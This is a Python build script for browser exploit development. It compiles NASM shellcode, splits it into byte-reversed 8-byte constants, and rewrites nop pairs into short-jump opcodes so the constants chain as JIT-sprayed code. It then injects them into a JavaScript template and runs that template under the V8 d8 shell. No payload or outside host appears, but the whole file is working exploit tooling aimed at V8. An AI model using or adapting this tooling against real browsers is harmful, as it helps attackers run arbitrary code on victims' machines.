import subprocess, sys, pyperclip

'''build shellcode ------------------------------------------------------------------- '''
print("[*] Using NASM to compile the shellcode...\n")
subprocess.run(["nasm.exe", "-f", "bin", "-o", "shellcode.bin", "shellcode.asm"])

''' process .bin file ------------------------------------------------------------------- '''
print("[*] Processing the .bin file...\n")
f = open("shellcode.bin", "rb")
contents = f.read()
f.close()

if len(contents) % 8 != 0:
    print("[!] There may be a problem with the shellcode! Check the .bin file for errors.")
    sys.exit(0)

current_qword = b""
reversed_qword = ""

shellcode_ouput = ""

shellcode_ouput += "let shellcode = [\n"

''' for debugging '''
shellcode_ouput += "  0x07eb909090909090n,\n"

''' use this for constant comparison '''
consts = {}

whacky_count = 0

for b in range(0, len(contents), 8):
    current_qword = contents[b:b+8]
    current_qword = current_qword[::-1]
    for e in current_qword:
       reversed_qword += f"{e:0{2}x}"
    if b + 9 > len(contents):
        reversed_qword = "0x" + reversed_qword + "n"
    else:
        reversed_qword = "0x" + reversed_qword + "n,"

    whacky_count += 1

    if whacky_count > 6 and whacky_count < 19:
        reversed_qword = reversed_qword.replace("0x9090", "0x0ceb")
    elif whacky_count > 18:
        reversed_qword = reversed_qword.replace("0x9090", "0x0feb")
    else:
        reversed_qword = reversed_qword.replace("0x9090", "0x07eb")

    shellcode_ouput += "  " + reversed_qword + "\n"

    if reversed_qword in consts:
        print("[!] " + reversed_qword + " is a duplicate constant!")
    else:
        consts[reversed_qword] = reversed_qword
    
    reversed_qword = ""

shellcode_ouput += "];\n"

''' build shellcode js file ------------------------------------------------------------------- '''
print("[*] Making the shellcode.js file...\n")

f = open("shellcode.template", "r")
js = f.read()
f.close()

print(shellcode_ouput)

js = js.replace("%shellcode%", shellcode_ouput)

f = open("shellcode.js", "w")
f.write(js)
f.close()

''' generate the wasm code ------------------------------------------------------------------- '''
print("[*] Generating the WASM code...\n")
subprocess.run([".\d8.exe", ".\shellcode.js"])
